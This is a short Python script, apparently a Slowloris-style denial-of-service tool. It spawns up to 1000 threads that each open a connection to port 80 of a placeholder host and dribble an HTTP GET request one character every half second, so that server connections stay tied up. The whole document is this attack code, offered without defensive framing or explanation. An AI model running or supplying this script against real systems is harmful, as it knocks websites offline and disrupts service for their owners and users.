import socket
import time
import threading

req =  """GET / HTTP/1.1
Host: HOSTNAME
"""
#list of words in the request
reql = list(req)
print(reql)

def slowl():
    #creating a socket amd connecting to the server
   s = socket.socket()
   s.connect(("HOSTNAME", 80))
    #sending the request bit by bit
   for i in reql:
       s.send(i.encode())
       #waiting for .5 sec to pass
       time.sleep(.5)
   print(s.recv(1024))
   s.close()


for i in range(1000):
    #creating threads
    send_thread = threading.Thread(target=slowl)
    send_thread.start()
    #waiting 1 sec to create another thread.
    time.sleep(1)


